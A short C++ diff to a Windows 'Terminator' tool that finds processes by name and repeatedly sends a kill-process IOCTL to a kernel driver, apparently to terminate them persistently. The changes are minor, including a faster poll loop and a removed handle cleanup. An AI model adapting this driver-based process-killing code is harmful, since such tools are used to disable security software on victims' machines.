@@ -29,7 +29,9 @@ std::vector<DWORD> Terminator::GetProcessPids(const std::vector<std::string>& na
     }
 
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return result;
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        return result;
+    }
 
     PROCESSENTRY32 pe32{};
     pe32.dwSize = sizeof(PROCESSENTRY32);
@@ -51,7 +53,6 @@ std::vector<DWORD> Terminator::GetProcessPids(const std::vector<std::string>& na
             }
         } while (Process32Next(hSnapshot, &pe32));
     }
-
     CloseHandle(hSnapshot);
     return result;
 }
@@ -67,8 +68,9 @@ void Terminator::ProcessKill(const std::vector<std::string>& processNames) {
     }
     printf("[+] Connected to driver. Monitoring for processes...\n");
 
-    DWORD bytesReturned = 0;
+    DWORD bytesReturned;
     while (true) {
+        bytesReturned = 0;
         const std::vector<DWORD> pids = GetProcessPids(processNames);
         for (DWORD pid : pids) {
                 printf("[*] Sending IOCTL 0x%lX to terminate PID %lu...\n", IOCTL_KILL_PROCESS, pid);
@@ -85,10 +87,8 @@ void Terminator::ProcessKill(const std::vector<std::string>& processNames) {
                     printf("[+] Success! IOCTL sent for PID %lu.\n", pid);
 }
         }
-        Sleep(500);
+        Sleep(300);
     }
-
-    CloseHandle(hDevice);
 }
 
 int main(int argc, char* argv[]) {
